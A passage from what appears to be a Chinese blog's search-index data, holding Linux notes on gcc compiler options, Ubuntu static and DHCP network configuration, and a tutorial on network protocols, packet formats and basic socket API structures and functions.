缺点：文件比较大 -shared 指定生成动态链接库 优点：生成文件比较小 缺点：运行时需要系统提供动态库 -symbolic 建立共享目标文件的时候,把引用绑定到全局符号上. 对所有无法解析的引用作出警告(除非用连接编辑选项 -Xlinker -z -Xlinker defs取代)。 注：只有部分系统支持该选项. 错误与警告 -Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告。也可以用-W{warning}来标记指定的警告。 -pedantic 允许发出ANSI/ISO C标准所列出的所有警告 -pedantic-errors 允许发出ANSI/ISO C标准所列出的错误 -werror 把所有警告转换为错误，以在警告发生时中止编译过程 -w 关闭所有警告,建议不要使用此项 预处理选项 -Dmacro 相当于C语言中的#define macro -Dmacro=defn 相当于C语言中的#define macro=defn -Umacro 相当于C语言中的#undef macro -undef 取消对任何非标准宏的定义 其他选项 -o 制定目标名称,缺省的时候,g++编译出来的文件是a.out 12345-O-O0-O1-O2-O3 编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高 -fpic 编译器就生成位置无关目标码.适用于共享库(shared library). -fPIC 编译器就输出位置无关目标码.适用于动态连接(dynamic linking),即使分支需要大范围转移. -v 显示详细的编译、汇编、连接命令","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"网络配置2","slug":"linux000网络配置2","date":"2022-02-08T10:43:17.000Z","updated":"2022-02-08T10:47:48.213Z","comments":true,"path":"2022/02/08/linux000网络配置2/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/02/08/linux000网络配置2/","excerpt":"","text":"Ubuntu16.04 命令行配置网络 1. 切换root 123su root sudo passwd root #首次需给root配置密码 2. 查看网卡信息 1ifconfig -a 看见如eth0或enp5s0或ens33或ens192等就可以，比如我的是enp3s0 3. 配置系统网络 网络接口配置文件: /etc/network/interfaces 1vi /etc/network/interfaces 修改为： 1234567891011121314151617#无需改动auto loiface lo inet loopback #添加以下：auto enp3s0 #开机自动连接网络(enp3s0 为网卡名称,ifconfig -a看自己的) iface enp3s0 inet static #static表示使用固定ip，dhcp表述使用动态ip address 192.168.1.84 #设置ip地址 netmask 255.255.255.0 #设置子网掩码 gateway 192.168.1.1 #设置网关 dns-nameservers 8.8.8.8 #设置DNS,谷歌dns#dns-nameservers 202.106.0.20 北京市联通dns 4. 重启网络服务 1service networking restart 然后ifconfig 查看ip信息 没效果就 reboot重启电脑 ping www.baidu.com 如下已连通 OK.","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"网络配置","slug":"linux000网络配置","date":"2022-02-08T10:24:04.000Z","updated":"2022-02-08T10:41:19.557Z","comments":true,"path":"2022/02/08/linux000网络配置/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/02/08/linux000网络配置/","excerpt":"","text":"Ubuntu18.04的网络配置（静态IP和动态IP） 查看Ubuntu系统的版本号命令 cat /etc/issue或者 lsb_release -a 切换root命令 sudo -i 或者 sudo -s 提示：以下操作均在root用户下进行，如在普通用户，请自行加上sudo！ 说明 Ubuntu从17.10开始，已放弃在/etc/network/interfaces里配置IP地址，即使配置也不会生效，而是改成netplan方式，配置写在/etc/netplan/01-netcfg.yaml或者类似名称的yaml文件里，如下： VMware14里安装的Ubuntu18.04.1 Desktop版本下的配置文件名： VMware14里安装的Ubuntu18.04.4 Server版本下的配置文件名： 阿里云Ubuntu18.04.4 Server版本下的配置文件名： 下面以VMware14里安装的Ubuntu 18.04.4 Server版本为例（VMware网络连接选择的桥接模式） 一、配置静态IP地址 打开配置文件：vim /etc/netplan/50-cloud-init.yaml，写入以下配置内容： 12345678910network: ethernets: ens33: # 配置的网卡名称 dhcp4: no # 关闭dhcp4 dhcp6: no # 关闭dhcp6 addresses: [192.168.0.120/24] # 设置本机IP地址及掩码 gateway4: 192.168.0.1 # 设置网关 nameservers: addresses: [114.114.114.114, 8.8.8.8] # 设置DNS version: 2 截图 配置完成后，保存并退出，执行netplan apply命令可以让配置直接生效 以前的重启网络服务命令 /etc/init.d/networking restart 或者 service networking restar 都是无法使用的（做测试时发现18.04.1的Desktop版本还是可以使用的，但/etc/netplan/下的yaml配置文件并不会生效）。 验证是否配置成功 ifconfig -a 验证是否能ping通外网 ping -c 4 baidu.com 二、配置动态IP地址 打开配置文件：vim /etc/netplan/50-cloud-init.yaml，写入以下配置内容（其实只需要开启dhcp就可以）： 123456network: ethernets: ens33: #配置网卡名称 dhcp4: true #开启dhcp4 dhcp4: true #开启dhcp4 version: 2 保存并退出，执行 netplan apply命令让配置生效，用上述方法验证是否配置成功！ 这里顺便也记录下Ubuntu 18.04.1 Desktop版本的配置，和18.04.4 Server版本略有区别（VMware网络连接选择的也是桥接模式） vim /etc/netplan/01-network-manager-all.yaml 1234567891011network: version: 2 # renderer: NetworkManager ethernets: ens33: dhcp4: no dhcp6: no addresses: [192.168.0.130/24] gateway4: 192.168.0.1 nameservers: addresses: [114.114.114.144, 8.8.8.8] 截图 这里有几点需要注意： 1、Ubuntu 18.04.1 Desktop版本配置的时候需要将renderer: NetworkManager一行注释掉，否则netplan命令无法生效； 2、配置信息要严格按照yaml语言的语法格式，每个配置项使用空格缩进表示层级关系；缩进不允许使用tab，只允许空格；缩进的空格数不重要，只要相同层级的元素左对齐即可，否则netplan命令会报错； 3、对应配置项后跟着冒号，之后要接个空格，否则netplan命令也会报错。 扩展 重新启停以太网卡命令： 123ifconfig ens33 down //关闭 ifconfig ens33 up //开启","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"网络编程","slug":"linux084网络基础","date":"2022-01-31T08:50:57.000Z","updated":"2023-07-14T11:25:12.149Z","comments":true,"path":"2022/01/31/linux084网络基础/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/31/linux084网络基础/","excerpt":"","text":"协议的概念 什么是协议 从应用的角度出发，协议可理解为“规则”，是数据传输和数据的解释的规则。 假设，A、B双方欲传输文件。规定： 第一次，传输文件名，接收方接收到文件名，应答OK给传输方； 第二次，发送文件的尺寸，接收方接收到该数据再次应答一个OK； 第三次，传输文件内容。同样，接收方接收数据完成后应答OK表示文件内容接收成功。 由此，无论A、B之间传递何种文件，都是通过三次数据传输来完成。A、B之间形成了一个最简单的数据传输规则。双方都按此规则发送、接收数据。A、B之间达成的这个相互遵守的规则即为协议。 这种仅在A、B之间被遵守的协议称之为原始协议。当此协议被更多的人采用，不断的增加、改进、维护、完善。最终形成一个稳定的、完整的文件传输协议，被广泛应用于各种文件传输过程中。该协议就成为一个标准协议。最早的ftp协议就是由此衍生而来。 TCP协议注重数据的传输。http协议着重于数据的解释。 典型协议 传输层 常见协议有TCP/UDP协议。 应用层 常见的协议有HTTP协议，FTP协议。 网络层 常见协议有IP协议、ICMP协议、IGMP协议。 网络接口层 常见协议有ARP协议、RARP协议。 TCP传输控制协议（Transmission Control Protocol）是一种面向连接的、可靠的、基于字节流的传输层通信协议。 UDP用户数据报协议（User Datagram Protocol）是OSI参考模型中一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务。 HTTP超文本传输协议（Hyper Text Transfer Protocol）是互联网上应用最为广泛的一种网络协议。 FTP文件传输协议（File Transfer Protocol） IP协议是因特网互联协议（Internet Protocol） ICMP协议是Internet控制报文协议（Internet Control Message Protocol）它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。 IGMP协议是 Internet 组管理协议（Internet Group Management Protocol），是因特网协议家族中的一个组播协议。该协议运行在主机和组播路由器之间。 ARP协议是正向地址解析协议（Address Resolution Protocol），通过已知的IP，寻找对应主机的MAC地址。 RARP是反向地址转换协议，通过MAC地址确定IP地址。 网络应用程序设计模式 C/S模式 ​ 传统的网络应用设计模式，客户机(client)/服务器(server)模式。需要在通讯两端各自部署客户机和服务器来完成数据通信。 优点: 协议选用灵活 可以提前缓存数据。 缺点: 1. 对用户的安全构成威胁 2. 开发工作量较大，调试困难 B/S模式 浏览器()/服务器(server)模式。只需在一端部署服务器，而另外一端使用每台PC都默认配置的浏览器即可完成数据的传输。 优点: 比较安全 开发工作简洁,只需要开发服务端 跨平台 缺点: 要求使用http协议 不可以提前缓存数据 分层模型 OSI七层模型 物理层：主要定义物理设备标准，如网线的接口类型、光纤的接口类型、各种传输介质的传输速率等。它的主要作用是传输比特流（就是由1、0转化为电流强弱来进行传输，到达目的地后再转化为1、0，也就是我们常说的数模转换与模数转换）。这一层的数据叫做比特。 数据链路层：定义了如何让格式化数据以帧为单位进行传输，以及如何让控制对物理介质的访问。这一层通常还提供错误检测和纠正，以确保数据的可靠传输。如：串口通信中使用到的115200、8、N、1 网络层：在位于不同地理位置的网络中的两个主机系统之间提供连接和路径选择。Internet的发展使得从世界各站点访问信息的用户数大大增加，而网络层正是管理这种连接的层。数据包 传输层：定义了一些传输数据的协议和端口号（WWW端口80等），如：TCP（传输控制协议，传输效率低，可靠性强，用于传输可靠性要求高，数据量大的数据），UDP（用户数据报协议，与TCP特性恰恰相反，用于传输可靠性要求不高，数据量小的数据，如QQ聊天数据就是通过这种方式传输的）。 主要是将从下层接收的数据进行分段和传输，到达目的地址后再进行重组。常常把这一层数据叫做段。 会话层：通过传输层(端口号：传输端口与接收端口)建立数据传输的通路。主要在你的系统之间发起会话或者接受会话请求（设备之间需要互相认识可以是IP也可以是MAC或者是主机名）。 表示层：可确保一个系统的应用层所发送的信息可以被另一个系统的应用层读取。例如，PC程序与另一台计算机进行通信，其中一台计算机使用扩展二一十进制交换码(EBCDIC)，而另一台则使用美国信息交换标准码（ASCII）来表示相同的字符。如有必要，表示层会通过使用一种通格式来实现多种数据格式之间的转换。 应用层：是最靠近用户的OSI层。这一层为用户的应用程序（例如电子邮件、文件传输和终端仿真）提供网络服务。 TCP/IP四层模型 TCP/IP网络协议栈分为应用层（Application）、传输层（Transport）、网络层（Network）和链路层（Link）四层。如下图所示： 一般在应用开发过程中，讨论最多的是TCP/IP模型。 通信过程 两台计算机通过TCP/IP协议通讯的过程如下所示： 上图对应两台计算机在同一网段中的情况，如果两台计算机在不同的网段中，那么数据从一台计算机到另一台计算机传输过程中要经过一个或多个路由器，如下图所示： 链路层有以太网、令牌环网等标准，链路层负责网卡设备的驱动、帧同步（即从网线上检测到什么信号算作新帧的开始）、冲突检测（如果检测到冲突就自动重发）、数据差错校验等工作。交换机是工作在链路层的网络设备，可以在不同的链路层网络之间转发数据帧（比如十兆以太网和百兆以太网之间、以太网和令牌环网之间），由于不同链路层的帧格式不同，交换机要将进来的数据包拆掉链路层首部重新封装之后再转发。 网络层的IP协议是构成Internet的基础。Internet上的主机通过IP地址来标识，Inter-net上有大量路由器负责根据IP地址选择合适的路径转发数据包，数据包从Internet上的源主机到目的主机往往要经过十多个路由器。路由器是工作在第三层的网络设备，同时兼有交换机的功能，可以在不同的链路层接口之间转发数据包，因此路由器需要将进来的数据包拆掉网络层和链路层两层首部并重新封装。IP协议不保证传输的可靠性，数据包在传输过程中可能丢失，可靠性可以在上层协议或应用程序中提供支持。 网络层负责点到点（ptop，point-to-point）的传输（这里的“点”指主机或路由器），而传输层负责端到端（etoe，end-to-end）的传输（这里的“端”指源主机和目的主机）。传输层可选择TCP或UDP协议。 TCP是一种面向连接的、可靠的协议，有点像打电话，双方拿起电话互通身份之后就建立了连接，然后说话就行了，这边说的话那边保证听得到，并且是按说话的顺序听到的，说完话挂机断开连接。也就是说TCP传输的双方需要首先建立连接，之后由TCP协议保证数据收发的可靠性，丢失的数据包自动重发，上层应用程序收到的总是可靠的数据流，通讯之后关闭连接。 UDP是无连接的传输协议，不保证可靠性，有点像寄信，信写好放到邮筒里，既不能保证信件在邮递过程中不会丢失，也不能保证信件寄送顺序。使用UDP协议的应用程序需要自己完成丢包重发、消息排序等工作。 目的主机收到数据包后，如何经过各层协议栈最后到达应用程序呢？其过程如下图所示： 以太网驱动程序首先根据以太网首部中的“上层协议”字段确定该数据帧的有效载荷（payload，指除去协议首部之外实际传输的数据）是IP、ARP还是RARP协议的数据报，然后交给相应的协议处理。假如是IP数据报，IP协议再根据IP首部中的“上层协议”字段确定该数据报的有效载荷是TCP、UDP、ICMP还是IGMP，然后交给相应的协议处理。假如是TCP段或UDP段，TCP或UDP协议再根据TCP首部或UDP首部的“端口号”字段确定应该将应用层数据交给哪个用户进程。IP地址是标识网络中不同主机的地址，而端口号就是同一台主机上标识不同进程的地址，IP地址和端口号合起来标识网络中唯一的进程。 虽然IP、ARP和RARP数据报都需要以太网驱动程序来封装成帧，但是从功能上划分，ARP和RARP属于链路层，IP属于网络层。虽然ICMP、IGMP、TCP、UDP的数据都需要IP协议来封装成数据报，但是从功能上划分，ICMP、IGMP与IP同属于网络层，TCP和UDP属于传输层。 协议格式 数据包封装 传输层及其以下的机制由内核提供，应用层由用户进程提供（后面将介绍如何使用socket API编写应用程序），应用程序对通讯数据的含义进行解释，而传输层及其以下处理通讯的细节，将数据从一台计算机通过一定的路径发送到另一台计算机。应用层数据通过协议栈发到网络上时，每层协议都要加上一个数据首部（header），称为封装（Encapsulation），如下图所示： 不同的协议层对数据包有不同的称谓，在传输层叫做段（segment），在网络层叫做数据报（datagram），在链路层叫做帧（frame）。数据封装成帧后发到传输介质上，到达目的主机后每层协议再剥掉相应的首部，最后将应用层数据交给应用程序处理。 以太网帧格式 以太网的帧格式如下所示： 其中的源地址和目的地址是指网卡的硬件地址（也叫MAC地址），长度是48位，是在网卡出厂时固化的。可在shell中使用ifconfig命令查看，“HWaddr 00:15:F2:14:9E:3F”部分就是硬件地址。协议字段有三种值，分别对应IP、ARP、RARP。帧尾是CRC校验码。 以太网帧中的数据长度规定最小46字节，最大1500字节，ARP和RARP数据包的长度不够46字节，要在后面补填充位。最大值1500称为以太网的最大传输单元（MTU），不同的网络类型有不同的MTU，如果一个数据包从以太网路由到拨号链路上，数据包长度大于拨号链路的MTU，则需要对数据包进行分片（fragmentation）。ifconfig命令输出中也有“MTU:1500”。注意，MTU这个概念指数据帧中有效载荷的最大长度，不包括帧头长度。 ARP数据报格式 在网络通讯时，源主机的应用程序知道目的主机的IP地址和端口号，却不知道目的主机的硬件地址，而数据包首先是被网卡接收到再去处理上层协议的，如果接收到的数据包的硬件地址与本机不符，则直接丢弃。因此在通讯前必须获得目的主机的硬件地址。ARP协议就起到这个作用。源主机发出ARP请求，询问“IP地址是192.168.0.1的主机的硬件地址是多少”，并将这个请求广播到本地网段（以太网帧首部的硬件地址填FF:FF:FF:FF:FF:FF表示广播），目的主机接收到广播的ARP请求，发现其中的IP地址与本机相符，则发送一个ARP应答数据包给源主机，将自己的硬件地址填写在应答包中。 每台主机都维护一个ARP缓存表，可以用arp -a命令查看。缓存表中的表项有过期时间（一般为20分钟），如果20分钟内没有再次使用某个表项，则该表项失效，下次还要发ARP请求来获得目的主机的硬件地址。想一想，为什么表项要有过期时间而不是一直有效？ ARP数据报的格式如下所示： 源MAC地址、目的MAC地址在以太网首部和ARP请求中各出现一次，对于链路层为以太网的情况是多余的，但如果链路层是其它类型的网络则有可能是必要的。硬件类型指链路层网络类型，1为以太网，协议类型指要转换的地址类型，0x0800为IP地址，后面两个地址长度对于以太网地址和IP地址分别为6和4（字节），op字段为1表示ARP请求，op字段为2表示ARP应答。 路由器会把arp数据报发给所有的机器，然后每个机器拿到后会检查接收端的ip是不是自己的ip，如果不是则扔掉 ARP数据报：获取下一条的mac地址 TTL:表示当前还可以进行多少跳，每次到达自己这里TTL都会减一 数据包到达路由器后会进行解封装,先解数据帧首尾,然后解网络层，然后再封装自己的ip和自己的mac地址，和目标mac地址，最后发出去，每次结果路由器都会重复上面步骤，直到到达目的pc IP段格式 IP数据报的首部长度和数据长度都是可变长的，但总是4字节的整数倍。对于IPv4，4位版本字段是4。4位首部长度的数值是以4字节为单位的，最小值为5，也就是说首部长度最小是4x5=20字节，也就是不带任何选项的IP首部，4位能表示的最大值是15，也就是说首部长度最大是60字节。8位TOS字段有3个位用来指定IP数据报的优先级（目前已经废弃不用），还有4个位表示可选的服务类型（最小延迟、最大?吐量、最大可靠性、最小成本），还有一个位总是0。总长度是整个数据报（包括IP首部和IP层payload）的字节数。每传一个IP数据报，16位的标识加1，可用于分片和重新组装数据报。3位标志和13位片偏移用于分片。TTL（Time to live)是这样用的：源主机为数据包设定一个生存时间，比如64，每过一个路由器就把该值减1，如果减到0就表示路由已经太长了仍然找不到目的主机的网络，就丢弃该包，因此这个生存时间的单位不是秒，而是跳（hop）。协议字段指示上层协议是TCP、UDP、ICMP还是IGMP。然后是校验和，只校验IP首部，数据的校验由更高层协议负责。IPv4的IP地址长度为32位。 想一想，前面讲了以太网帧中的最小数据长度为46字节，不足46字节的要用填充字节补上，那么如何界定这46字节里前多少个字节是IP、ARP或RARP数据报而后面是填充字节？ UDP数据报格式 端口号表示指定的进程 1234567891011121314151617181920212223下面分析一帧基于UDP的TFTP协议帧。以太网首部0000: 00 05 5d 67 d0 b1 00 05 5d 61 58 a8 08 00IP首部0000: 45 000010: 00 53 93 25 00 00 80 11 25 ec c0 a8 00 37 c0 a80020: 00 01UDP首部0020： 05 d4 00 45 00 3f ac 40TFTP协议0020: 00 01 &apos;c&apos;&apos;:&apos;&apos;\\&apos;&apos;q&apos;0030: &apos;w&apos;&apos;e&apos;&apos;r&apos;&apos;q&apos;&apos;.&apos;&apos;q&apos;&apos;w&apos;&apos;e&apos;00 &apos;n&apos;&apos;e&apos;&apos;t&apos;&apos;a&apos;&apos;s&apos;&apos;c&apos;&apos;i&apos;0040: &apos;i&apos;00 &apos;b&apos;&apos;l&apos;&apos;k&apos;&apos;s&apos;&apos;i&apos;&apos;z&apos;&apos;e&apos;00 &apos;5&apos;&apos;1&apos;&apos;2&apos;00 &apos;t&apos;&apos;i&apos;0050: &apos;m&apos;&apos;e&apos;&apos;o&apos;&apos;u&apos;&apos;t&apos;00 &apos;1&apos;&apos;0&apos;00 &apos;t&apos;&apos;s&apos;&apos;i&apos;&apos;z&apos;&apos;e&apos;00 &apos;0&apos;0060: 00以太网首部：源MAC地址是00:05:5d:61:58:a8，目的MAC地址是00:05:5d:67:d0:b1，上层协议类型0x0800表示IP。IP首部：每一个字节0x45包含4位版本号和4位首部长度，版本号为4，即IPv4，首部长度为5，说明IP首部不带有选项字段。服务类型为0，没有使用服务。16位总长度字段（包括IP首部和IP层payload的长度）为0x0053，即83字节，加上以太网首部14字节可知整个帧长度是97字节。IP报标识是0x9325，标志字段和片偏移字段设置为0x0000，就是DF=0允许分片，MF=0此数据报没有更多分片，没有分片偏移。TTL是0x80，也就是128。上层协议0x11表示UDP协议。IP首部校验和为0x25ec，源主机IP是c0 a8 00 37（192.168.0.55），目的主机IP是c0 a8 00 01（192.168.0.1）。UDP首部：源端口号0x05d4（1492）是客户端的端口号，目的端口号0x0045（69）是TFTP服务的well-known端口号。UDP报长度为0x003f，即63字节，包括UDP首部和UDP层pay-load的长度。UDP首部和UDP层payload的校验和为0xac40。TFTP是基于文本的协议，各字段之间用字节0分隔，开头的00 01表示请求读取一个文件，接下来的各字段是：c:\\qwerq.qwenetasciiblksize 512timeout 10tsize 0 一般的网络通信都是像TFTP协议这样，通信的双方分别是客户端和服务器，客户端主动发起请求（上面的例子就是客户端发起的请求帧），而服务器被动地等待、接收和应答请求。客户端的IP地址和端口号唯一标识了该主机上的TFTP客户端进程，服务器的IP地址和端口号唯一标识了该主机上的TFTP服务进程，由于客户端是主动发起请求的一方，它必须知道服务器的IP地址和TFTP服务进程的端口号，所以，一些常见的网络协议有默认的服务器端口，例如HTTP服务默认TCP协议的80端口，FTP服务默认TCP协议的21端口，TFTP服务默认UDP协议的69端口（如上例所示）。在使用客户端程序时，必须指定服务器的主机名或IP地址，如果不明确指定端口号则采用默认端口，请读者查阅ftp、tftp等程序的man page了解如何指定端口号。/etc/services中列出了所有well-known的服务端口和对应的传输层协议，这是由IANA（Internet Assigned Numbers Authority）规定的，其中有些服务既可以用TCP也可以用UDP，为了清晰，IANA规定这样的服务采用相同的TCP或UDP默认端口号，而另外一些TCP和UDP的相同端口号却对应不同的服务。 很多服务有well-known的端口号，然而客户端程序的端口号却不必是well-known的，往往是每次运行客户端程序时由系统自动分配一个空闲的端口号，用完就释放掉，称为ephemeral的端口号，想想这是为什么？ 前面提过，UDP协议不面向连接，也不保证传输的可靠性，例如： 发送端的UDP协议层只管把应用层传来的数据封装成段交给IP协议层就算完成任务了，如果因为网络故障该段无法发到对方，UDP协议层也不会给应用层返回任何错误信息。 接收端的UDP协议层只管把收到的数据根据端口号交给相应的应用程序就算完成任务了，如果发送端发来多个数据包并且在网络上经过不同的路由，到达接收端时顺序已经错乱了，UDP协议层也不保证按发送时的顺序交给应用层。 通常接收端的UDP协议层将收到的数据放在一个固定大小的缓冲区中等待应用程序来提取和处理，如果应用程序提取和处理的速度很慢，而发送端发送的速度很快，就会丢失数据包，UDP协议层并不报告这种错误。 因此，使用UDP协议的应用程序必须考虑到这些可能的问题并实现适当的解决方案，例如等待应答、超时重发、为数据包编号、流量控制等。一般使用UDP协议的应用程序实现都比较简单，只是发送一些对可靠性要求不高的消息，而不发送大量的数据。例如，基于UDP的TFTP协议一般只用于传送小文件（所以才叫trivial的ftp），而基于TCP的FTP协议适用于 各种文件的传输。TCP协议又是如何用面向连接的服务来代替应用程序解决传输的可靠性问题呢。 TCP数据报格式 与UDP协议一样也有源端口号和目的端口号，通讯的双方由IP地址和端口号标识。32位序号、32位确认序号、窗口大小稍后详细解释。4位首部长度和IP协议头类似，表示TCP协议头的长度，以4字节为单位，因此TCP协议头最长可以是4x15=60字节，如果没有选项字段，TCP协议头最短20字节。URG、ACK、PSH、RST、SYN、FIN是六个控制位，本节稍后将解释SYN、ACK、FIN、RST四个位，其它位的解释从略。16位检验和将TCP协议头和数据都计算在内。紧急指针和各种选项的解释从略。 NAT映射 A机器发送数据包给服务器,首先数据包经过路由器,然后路由器会一个端口号和自己的ip再和A机器的ip成为映射关系,服务器收到后回A机器数据包,目的ip的地址是写路由器的ip,端口号写路由器创建出来的那个端口号,路由器收到数据包后会在NAT映射表中查找端口号对应的ip,找到后再发给A机器 打洞机制 两台机器在不同的局域网中进行直接通信,需要进行nat映射和打洞机制. Socket编程 套接字概念 Socket本身有“插座”的意思，在Linux环境下，用于表示进程间网络通信的特殊文件类型。本质为内核借助缓冲区形成的伪文件。 既然是文件，那么理所当然的，我们可以使用文件描述符引用套接字。与管道类似的，Linux系统将其封装成文件的目的是为了统一接口，使得读写套接字和读写文件的操作一致。区别是管道主要应用于本地进程间通信，而套接字多应用于网络进程间数据的传递。 套接字的内核实现较为复杂，不宜在学习初期深入学习。 在TCP/IP协议中，“IP地址+TCP或UDP端口号”唯一标识网络通讯中的一个进程。“IP地址+端口号”就对应一个socket。欲建立连接的两个进程各自有一个socket来标识，那么这两个socket组成的socket pair就唯一标识一个连接。因此可以用Socket来描述网络连接的一对一关系。 套接字通信原理如下图所示： 在网络通信中，套接字一定是成对出现的。一端的发送缓冲区对应对端的接收缓冲区。我们使用同一个文件描述符索发送缓冲区和接收缓冲区。 TCP/IP协议最早在BSD UNIX上实现，为TCP/IP协议设计的应用层编程接口称为socket API。本章的主要内容是socket API，主要介绍TCP协议的函数接口，最后介绍UDP协议和UNIX Domain Socket的函数接口。 网络字节序 我们已经知道，内存中的多字节数据相对于内存地址有大端和小端之分，磁盘文件中的多字节数据相对于文件中的偏移地址也有大端小端之分。网络数据流同样有大端小端之分，那么如何定义网络数据流的地址呢？发送主机通常将发送缓冲区中的数据按内存地址从低到高的顺序发 出，接收主机把从网络上接到的字节依次保存在接收缓冲区中，也是按内存地址从低到高的顺序保存，因此，网络数据流的地址应这样规定：先发出的数据是低地址，后发出的数据是高地址。 TCP/IP协议规定，网络数据流应采用大端字节序，即低地址高字节。例如上一节的UDP段格式，地址0-1是16位的源端口号，如果这个端口号是1000（0x3e8），则地址0是0x03，地址1是0xe8，也就是先发0x03，再发0xe8，这16位在发送主机的缓冲区中也应该是低地址存0x03，高地址存0xe8。但是，如果发送主机是小端字节序的，这16位被解释成0xe803，而不是1000。因此，发送主机把1000填到发送缓冲区之前需要做字节序的转换。同样地，接收主机如果是小端字节序的，接到16位的源端口号也要做字节序的转换。如果主机是大端字节序的，发送和接收都不需要做转换。同理，32位的IP地址也要考虑网络字节序和主机字节序的问题。 为使网络程序具有可移植性，使同样的C代码在大端和小端计算机上编译后都能正常运行，可以调用以下库函数做网络字节序和主机字节序的转换。 1234567//要包含的头文件#include &lt;arpa/inet.h&gt;uint32_t htonl(uint32_t hostlong); //ip本地字节序转换到网络字节序uint16_t htons(uint16_t hostshort); //端口本地字节序转换到网络字节序uint32_t ntohl(uint32_t netlong); //ip网络字节序转换为本地字节序uint16_t ntohs(uint16_t netshort); //端口网络字节序转换为本地字节序 h表示host，n表示network，l表示32位长整数，s表示16位短整数。 如果主机是小端字节序，这些函数将参数做相应的大小端转换然后返回，如果主机是大端字节序，这些函数不做转换，将参数原封不动地返回。 IP地址转换函数 早期： 123456789#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;int inet_aton(const char *cp, struct in_addr *inp);in_addr_t inet_addr(const char *cp);char *inet_ntoa(struct in_addr in);只能处理IPv4的ip地址不可重入函数注意参数是struct in_addr 现在： 12345678910111213#include &lt;arpa/inet.h&gt;int inet_pton(int af, const char *src, void *dst); //字符串点分十进制ip转换为网络字节序参数1: AF_INET (ipv4) AF_INET6 (ipv6) //网络字节序ip转换成点分十进制ip字符串const char *inet_ntop(int af, const void *src, char *dst, socklen_t size);参数1: AF_INET (ipv4) AF_INET6 (ipv6) 两个函数错误返回-1并设置errno 支持IPv4和IPv6 可重入函数 其中inet_pton和inet_ntop不仅可以转换IPv4的in_addr，还可以转换IPv6的in6_addr。 因此函数接口是void *addrptr。 sockaddr数据结构 strcut sockaddr 很多网络编程函数诞生早于IPv4协议，那时候都使用的是sockaddr结构体,为了向前兼容，现在sockaddr退化成了（void *）的作用，传递一个地址给函数，至于这个函数是sockaddr_in还是sockaddr_in6，由地址族确定，然后函数内部再强制类型转化为所需的地址类型。 1234struct sockaddr &#123; sa_family_t sa_family; /* address family, AF_xxx */ char sa_data[14]; /* 14 bytes of protocol address */&#125;; 1使用 sudo grep -r &quot;struct sockaddr_in &#123;&quot; /usr 命令可查看到struct sockaddr_in结构体的定义。一般其默认的存储位置：/usr/include/linux/in.h 文件中。 一般使用这个 1234567891011121314struct sockaddr_in &#123; __kernel_sa_family_t sin_family; /* Address family */ 地址结构类型 __be16 sin_port; /* Port number */ 端口号 struct in_addr sin_addr; /* Internet address */ IP地址 /* Pad to size of `struct sockaddr&apos;. */ unsigned char __pad[__SOCK_SIZE__ - sizeof(short int) - sizeof(unsigned short int) - sizeof(struct in_addr)];&#125;;struct in_addr &#123; /* Internet address. */ __be32 s_addr;&#125;; 1234567struct sockaddr_in6 &#123; unsigned short int sin6_family; /* AF_INET6 */ __be16 sin6_port; /* Transport layer port # */ __be32 sin6_flowinfo; /* IPv6 flow information */ struct in6_addr sin6_addr; /* IPv6 address */ __u32 sin6_scope_id; /* scope id (new in RFC2553) */&#125;; 12345678910111213141516struct in6_addr &#123; union &#123; __u8 u6_addr8[16]; __be16 u6_addr16[8]; __be32 u6_addr32[4]; &#125; in6_u; #define s6_addr in6_u.u6_addr8 #define s6_addr16 in6_u.u6_addr16 #define s6_addr32 in6_u.u6_addr32&#125;;#define UNIX_PATH_MAX 108 struct sockaddr_un &#123; __kernel_sa_family_t sun_family; /* AF_UNIX */ char sun_path[UNIX_PATH_MAX]; /* pathname */&#125;; Pv4和IPv6的地址格式定义在netinet/in.h中，IPv4地址用sockaddr_in结构体表示，包括16位端口号和32位IP地址，IPv6地址用sockaddr_in6结构体表示，包括16位端口号、128位IP地址和一些控制字段。UNIX Domain Socket的地址格式定义在sys/un.h中，用sock-addr_un结构体表示。各种socket地址结构体的开头都是相同的，前16位表示整个结构体的长度（并不是所有UNIX的实现都有长度字段，如Linux就没有），后16位表示地址类型。IPv4、IPv6和Unix Domain Socket的地址类型分别定义为常数AF_INET、AF_INET6、AF_UNIX。这样，只要取得某种sockaddr结构体的首地址，不需要知道具体是哪种类型的sockaddr结构体，就可以根据地址类型字段确定结构体中的内容。因此，socket API可以接受各种类型的sockaddr结构体指针做参数，例如bind、accept、connect等函数，这些函数的参数应该设计成void *类型以便接受各种类型的指针，但是sock API的实现早于ANSI C标准化，那时还没有void *类型，因此这些函数的参数都用struct sockaddr *类型表示，在传递参数之前要强制类型转换一下，例如： 12struct sockaddr_in servaddr;bind(listen_fd, (struct sockaddr *)&amp;servaddr, sizeof(servaddr)); /* initialize servaddr */ 网络套接字函数 socket模型创建流程图 socket函数 1234567891011121314151617#include &lt;sys/types.h&gt; /* See NOTES */#include &lt;sys/socket.h&gt;int socket(int domain, int type, int protocol);domain: AF_INET 这是大多数用来产生socket的协议，使用TCP或UDP来传输，用IPv4的地址 AF_INET6 与上面类似，不过是来用IPv6的地址 AF_UNIX 本地协议，使用在Unix和Linux系统上，一般都是当客户端和服务器在同一台及其上的时候使用type: SOCK_STREAM 这个协议是按照顺序的、可靠的、数据完整的基于字节流的连接。这是一个使用最多的socket类型，这个socket是使用TCP来进行传输。 SOCK_DGRAM 这个协议是无连接的、固定长度的传输调用。该协议是不可靠的，使用UDP来进行它的连接。 SOCK_SEQPACKET该协议是双线路的、可靠的连接，发送固定长度的数据包进行传输。必须把这个包完整的接受才能进行读取。 SOCK_RAW socket类型提供单一的网络访问，这个socket类型使用ICMP公共协议。（ping、traceroute使用该协议） SOCK_RDM 这个类型是很少使用的，在大部分的操作系统上没有实现，它是提供给数据链路层使用，不保证数据包的顺序protocol: 传0 